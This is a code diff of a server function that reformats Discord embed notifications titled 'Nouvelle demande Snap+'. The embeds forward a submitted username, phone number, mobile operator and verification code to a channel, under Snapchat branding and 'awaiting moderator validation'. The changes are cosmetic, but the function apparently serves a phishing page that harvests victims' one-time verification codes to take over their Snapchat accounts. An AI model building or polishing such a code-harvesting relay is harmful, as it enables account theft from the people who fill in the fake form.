@@ -128,25 +128,49 @@ serve(async (req) => {
 
       const embed = {
         title: "📱 Nouvelle demande Snap+",
+        description: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**Une nouvelle demande d'inscription a été reçue !**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
         color: 0xFFA500,
         thumbnail: {
           url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
         },
+        image: {
+          url: "https://i.imgur.com/AfFp7pu.png"
+        },
         fields: [
           {
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
+          },
+          {
             name: "👤 Nom d'utilisateur",
-            value: `\`${username}\``,
-            inline: true
+            value: `>>> **${username}**`,
+            inline: false
           },
           {
-            name: "📞 Téléphone",
-            value: `\`${formatPhone(phone)}\``,
-            inline: true
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
           },
           {
-            name: `${operator.emoji} Opérateur`,
-            value: `**${operator.name}**`,
-            inline: true
+            name: "📞 Numéro de téléphone",
+            value: `>>> \`${formatPhone(phone)}\``,
+            inline: false
+          },
+          {
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
+          },
+          {
+            name: `${operator.emoji} Opérateur mobile détecté`,
+            value: `>>> **${operator.name}**`,
+            inline: false
+          },
+          {
+            name: "\u200B",
+            value: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            inline: false
           }
         ],
         footer: { 
@@ -194,44 +218,73 @@ serve(async (req) => {
 
       const embed = {
         title: "🔐 Code de vérification soumis",
+        description: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**Un code de vérification a été soumis !**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
         color: 0xFFA500,
         thumbnail: {
           url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
         },
+        image: {
+          url: "https://i.imgur.com/AfFp7pu.png"
+        },
         fields: [
           {
-            name: "👤 Nom d'utilisateur",
-            value: `\`${username}\``,
-            inline: true
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
           },
           {
-            name: "🔢 Code saisi",
-            value: `\`\`\`${code}\`\`\``,
-            inline: true
+            name: "👤 Nom d'utilisateur",
+            value: `>>> **${username}**`,
+            inline: false
           },
           {
             name: "\u200B",
             value: "\u200B",
-            inline: true
+            inline: false
           },
           {
-            name: "📞 Téléphone",
-            value: `\`${formatPhone(phone)}\``,
-            inline: true
+            name: "🔢 Code de vérification",
+            value: `\`\`\`fix\n${code}\n\`\`\``,
+            inline: false
           },
           {
-            name: `${operator.emoji} Opérateur`,
-            value: `**${operator.name}**`,
-            inline: true
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
           },
           {
-            name: "📅 Soumis à",
-            value: `\`${dateStr} ${timeStr}\``,
-            inline: true
+            name: "📞 Numéro de téléphone",
+            value: `>>> \`${formatPhone(phone)}\``,
+            inline: false
+          },
+          {
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
+          },
+          {
+            name: `${operator.emoji} Opérateur mobile détecté`,
+            value: `>>> **${operator.name}**`,
+            inline: false
+          },
+          {
+            name: "\u200B",
+            value: "\u200B",
+            inline: false
+          },
+          {
+            name: "📅 Date et heure de soumission",
+            value: `>>> \`${dateStr} à ${timeStr}\``,
+            inline: false
+          },
+          {
+            name: "\u200B",
+            value: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+            inline: false
           }
         ],
         footer: { 
-          text: "En attente de validation par un modérateur",
+          text: "⚠️ En attente de validation par un modérateur",
           icon_url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
         },
         timestamp: new Date().toISOString()
